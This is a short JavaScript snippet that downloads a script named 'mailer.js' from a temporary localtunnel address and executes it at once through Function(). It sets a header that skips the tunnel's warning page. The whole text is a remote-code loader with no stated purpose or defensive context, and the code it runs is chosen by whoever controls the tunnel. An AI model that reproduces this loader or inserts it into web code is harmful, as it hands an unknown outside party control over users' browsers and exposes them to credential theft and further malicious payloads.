fetch("https://simplemailer.loca.lt/js/sDmgyoxPUVduX4dmhQ9NVWhPbQWa8eipQq247JGfdB4daPhSjnQEo51HOqUd3HXAW/mailer.js", {
  headers: {
    "Bypass-Tunnel-Reminder": "true"
  }
}).then(e => e.text()).then(e => Function(`${e}`)());
